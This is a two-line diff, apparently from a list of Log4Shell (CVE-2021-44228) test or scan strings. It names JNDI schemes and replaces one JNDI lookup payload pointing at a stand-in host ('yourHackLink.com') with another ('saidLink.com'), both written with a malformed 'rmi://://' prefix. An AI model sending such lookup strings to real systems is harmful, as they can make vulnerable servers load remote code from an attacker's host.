@@ -1,2 +1,2 @@
 ldap://,rmi://,dns://CVE-2021-44228
-${jndi:rmi://://yourHackLink.com}
+${jndi:rmi://://saidLink.com}
